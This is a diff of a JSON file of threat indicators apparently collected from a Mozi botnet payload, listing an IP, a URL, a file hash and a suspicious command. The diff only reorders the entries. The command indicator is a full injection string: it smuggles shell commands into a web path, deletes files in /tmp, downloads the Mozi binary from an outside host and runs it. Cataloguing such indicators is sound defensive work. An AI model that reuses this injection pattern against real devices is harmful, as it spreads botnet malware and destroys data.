@@ -1,26 +1,26 @@
 [
   {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "110.37.80.XXX"
-  },
-  {
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
     "value": "hxxp://110.37.80.XXX:47114/Mozi.a;sh$"
   },
   {
-    "context": "Inbound payload hash (unknown)",
+    "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
-    "type": "hash",
-    "value": "0d87c236d835dfba4ca01a6f7d2df01b23bcbb9bff51d7f5ff03d1f739788e09"
+    "type": "ip",
+    "value": "110.37.80.XXX"
   },
   {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
     "value": "GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://110.37.80.XXX:47114/Mozi.a;sh${IFS}/tmp/Mozi"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "0d87c236d835dfba4ca01a6f7d2df01b23bcbb9bff51d7f5ff03d1f739788e09"
   }
 ]
